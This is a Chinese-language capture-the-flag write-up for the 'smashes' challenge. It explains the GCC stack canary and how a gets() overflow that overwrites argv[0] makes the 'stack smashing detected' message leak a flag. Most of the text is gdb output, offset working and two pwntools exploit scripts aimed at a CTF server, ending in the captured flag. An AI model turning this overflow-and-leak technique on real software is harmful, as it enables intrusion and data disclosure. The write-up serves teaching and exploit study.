SSP（Stack Smashing Protector）leak。

SSP外号叫金丝雀。应对“栈溢出”（也称缓存区溢出），需要一些对策。比如GCC的“Stack-Smashing
Protector”机制（在数组后插入一些金丝雀(Canary,
因为大家在矿井作业时，会用金丝雀来预警，如果金丝雀死了，那证明有毒气)，在函数执行完成返回之前会检查一下Canary，如果canary被改掉，则不再继续执行，中止程序，避免执行攻击者的代码。）。如果发现
canary 被修改的话，程序就会执行 __stack_chk_fail 函数来打印 argv[0]
指针所指向的字符串，正常情况下，这个指针指向了程序名。其代码如下


	void __attribute__ ((noreturn)) __stack_chk_fail (void)

	{

		__fortify_fail ("stack smashing detected");

	}

	void __attribute__ ((noreturn)) internal_function __fortify_fail (const char*msg)

	{

		/* The loop is added only to keep gcc happy. */

		while (1)

		__libc_message (2, "*** %s ***: %s terminatedn",

		msg, __libc_argv[0] ?: "<unknown>");

	}


所以说如果我们利用栈溢出覆盖 argv[0]
为我们想要输出的字符串的地址，那么在 __fortify_fail 函数中就会输出我们想要的信息。

这道题利用是保护机制本身的一种漏洞，利用canary来打印出我们需要的flag

题目链接：https://pan.baidu.com/s/1yn4y-ic3FBRDOXFYA7e80w

提取码：jifg

64位文件，先看保护，

	gdb-peda$ checksec

	CANARY : ENABLED

	FORTIFY : ENABLED

	NX : ENABLED

	PIE : disabled

	RELRO : disabled

开了NX和CANARY。再看主要的函数，

	unsigned __int64 sub_4007E0()

	{

		__int64 v0; // rbx

		int v1; // eax

		__int64 v3; // [rsp+0h] [rbp-128h]

		unsigned __int64 v4; // [rsp+108h] [rbp-20h]

		v4 = __readfsqword(0x28u);

		__printf_chk(1LL, "Hello!\nWhat's your name? ");

		if ( !_IO_gets(&v3) )

		LABEL_9:

			_exit(1);

		v0 = 0LL;

		__printf_chk(1LL, "Nice to meet you, %s.\nPlease overwrite the flag: ");

		while ( 1 )

		{

			v1 = _IO_getc(stdin);

			if ( v1 == -1 )

			goto LABEL_9;

			if ( v1 == 10 )

			break;

			byte_600D20[v0++] = v1;

			if ( v0 == 32 )

				goto LABEL_8;

		}

		memset((void *)((signed int)v0 + 6294816LL), 0, (unsigned int)(32 - v0));

	LABEL_8:

		puts("Thank you, bye!");

		return __readfsqword(0x28u) ^ v4;

	}

这里很明显有了栈溢出，同时我们在查看字符串的时候发现了

	.data:0000000000600D21 0000001F C CTF{Here's the flag on server}

这显然不是服务器上的flag，但我们可以利用他所在的地址拿到服务器上的flag。但在函数里面这里的flag会被输入的数修改，所以不能用这个，这里就有了这道题第二个难点ELF的重映射，当ELF文件比较小的时候，他的不同区段可能会被多次映射，也就是说flag可能有备份，gdb查找一下。

	gdb-peda$ find CTF

	Searching for 'CTF' in: None ranges

	Found 2 results, display max 2 items:

	smashes : 0x400d21 ("CTF{Here's the "...)

	smashes : 0x600d21 ("CTF{Here's the "...)

这里的0x400d21里面的值就是flag的备份，且不会被修改，就用它了。

接下来就是找偏移的位置，先找到argv[0]所在的位置，把断点断在主函数，

	► 0x4006d0 sub rsp, 8

	0x4006d4 mov rdi, qword ptr [rip + 0x200665] <0x600d40>

	0x4006db xor esi, esi

	0x4006dd call setbuf@plt <0x400660>

	0x4006e2 call 0x4007e0

	0x4006e7 xor eax, eax

	0x4006e9 add rsp, 8

	0x4006ed ret

	0x4006ee xor ebp, ebp

	0x4006f0 mov r9, rdx

	0x4006f3 pop rsi

	──────────────────────────────────────────────────────[ STACK]──────────────────────────────────────────────────────

	00:0000│ rsp 0x7fffffffe008 —▸ 0x7ffff7a05b97 (__libc_start_main+231) ◂— mov edi, eax

	01:0008│ 0x7fffffffe010 ◂— 0x1

	02:0010│ 0x7fffffffe018 —▸ 0x7fffffffe0e8 —▸ 0x7fffffffe407 ◂— 0x616b2f656d6f682f ('/home/ka')

	03:0018│ 0x7fffffffe020 ◂— 0x100008000

	04:0020│ 0x7fffffffe028 —▸ 0x4006d0 ◂— sub rsp, 8

	05:0028│ 0x7fffffffe030 ◂— 0x0

	06:0030│ 0x7fffffffe038 ◂— 0x9c0b903eb803e49e

	07:0038│ 0x7fffffffe040 —▸ 0x4006ee ◂— xor ebp, ebp

0x7fffffffe0e8里面存的就是现在的程序名。

接下来找gets的位置。

	RBP 0x4008b0 ▸— push r15

	RSP 0x7fffffffded0 —▸ 0x7fffffffe040 —▸ 0x4006ee ◂— xor ebp, ebp

	RIP 0x40080e ◂— call 0x4006c0

	─────────────────────────────────────────────────────[ DISASM]──────────────────────────────────────────────────────

	0x4007f3 mov rax, qword ptr fs:[0x28]

	0x4007fc mov qword ptr [rsp + 0x108], rax

	0x400804 xor eax, eax

	0x400806 call __printf_chk@plt <0x4006b0>

	0x40080b mov rdi, rsp

	► 0x40080e call _IO_gets@plt <0x4006c0>

	rdi: 0x7fffffffded0 —▸ 0x7fffffffe040 —▸ 0x4006ee ◂— xor ebp, ebp

	rsi: 0x19

	rdx: 0x7ffff7dd18c0 (_IO_stdfile_1_lock) ◂— 0x0

	rcx: 0x0

	0x400813 test rax, rax

	0x400816 je 0x40089f

	0x40081c mov rdx, rsp

	0x40081f mov esi, 0x400960

	0x400824 mov edi, 1

	──────────────────────────────────────────────────────[ STACK]──────────────────────────────────────────────────────

	00:0000│ rdi rsp 0x7fffffffded0 —▸ 0x7fffffffe040 —▸ 0x4006ee ◂— xor ebp, ebp

	01:0008│ 0x7fffffffded8 —▸ 0x7ffff7ffe710 —▸ 0x7ffff7ffa000 ◂— jg 0x7ffff7ffa047

	02:0010│ 0x7fffffffdee0 ◂— 0x0

	03:0018│ 0x7fffffffdee8 —▸ 0x7ffff7de01ef (_dl_lookup_symbol_x+319) ◂— add rsp,
	0x30

	04:0020│ 0x7fffffffdef0 ◂— 0x0

	05:0028│ 0x7fffffffdef8 —▸ 0x7fffffffe040 —▸ 0x4006ee ◂— xor ebp, ebp

	06:0030│ 0x7fffffffdf00 ◂— 0x2

	07:0038│ 0x7fffffffdf08 ◂— 0x800000000000000e

gets所在的RSP为0x7fffffffded0，所以便宜的位置就是0x7fffffffded0-0x7fffffffe0e8

接下来就是写exp了

	from pwn import *

	r=process('./smashes')

	#r=remote('pwn.jarvisoj.com',9877)

	flag_addr=0x400d20

	argv_addr=0x7fffffffe0e8

	gets_rsp_addr=0x7fffffffded0

	payload='a'*(argv_addr-gets_rsp_addr)+p64(flag_addr)

	r.recvline("What's your name?n")

	r.sendline(payload)

	r.interactive()

	

	@ubuntu:~/Desktop$ python smashes.py

	[+] Opening connection to pwn.jarvisoj.com on port 9877: Done

	[*] Switching to interactive mode

	What's your name? Nice to meet you,
	aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
	aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
	aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
	aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
	aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
	aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
	aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
	aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@.

	Please overwrite the flag: $

	Thank you, bye!

	*** stack smashing detected ***: PCTF{57dErr_Smasher_good_work!}
	terminated

	[*] Got EOF while reading in interactive


拿到flag。

还有一种办法就是直接用大量flag的地址填充，但不要太多。


	from pwn import *

	#r=process('./smashes')

	r=remote('pwn.jarvisoj.com',9877)

	flag_addr=0x400d20

	payload=p64(flag_addr)*100

	r.sendline(payload)

	r.interactive()
